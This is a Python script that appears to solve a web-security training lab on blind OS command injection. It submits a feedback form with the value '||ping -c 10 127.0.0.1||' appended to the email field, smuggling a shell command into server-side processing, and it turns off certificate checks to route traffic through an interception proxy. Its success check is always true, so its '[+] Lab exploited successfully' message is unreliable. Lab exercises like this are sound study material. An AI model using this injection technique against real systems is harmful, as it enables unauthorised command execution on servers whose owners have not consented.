#Step 1:
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Avoid url warnings from showing.

#Step 2: defining the used variables, copied with copy_as_python_request.
burp0_url = "https://0ac00040037b39d080828a9a0087000e.web-security-academy.net:443/feedback/submit" #target url

burp0_cookies = {"session": "ReBvEQ5o39MEzUP4xYszGrntDpX6qmCk"} #cookies
payload = "||ping -c 10 127.0.0.1||" # payload to exploit the lab.
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0ac00040037b39d080828a9a0087000e.web-security-academy.net", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://0ac00040037b39d080828a9a0087000e.web-security-academy.net/feedback", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=1", "Te": "trailers"} # request headers.
burp0_data = {"csrf": "OxzBQQF7B3XRXeM9KzU5uBzENDwxyobH", "name": "lol", "email": "lol@gmail.com%s" + payload, "subject": "lol", "message": "adertfg"} # request payload with the exploit in the email dictionary.

proxy = {"http": "http://127.0.0.1:8080/", "https" : "http://127.0.0.1:8080/"}# proxy to allow the traffic interception with burpsuit.

# Step 3: Set the request method and add the request components.
r = requests.post(url = burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxy, verify=False)
# request components:
# burp0_url: this is the url to be sent on the request.
# burp0_headers: this is the headers to be included in the request.
# cookies: cookies to be included in the request.
# data: these are the data that include the payload to be exploited.
# verify: this is set to prevent the certificate check.
# proxy: used to allow the traffic to be intercepted and passed through the burpsuit.

#Step 4: Add a conditional statement to check if the lab is solved or not.
if '200' or '302' in r.text:
    print("[+] Lab exploited successfully.")
else:
    print("[-] Lab not successfully exploited.")
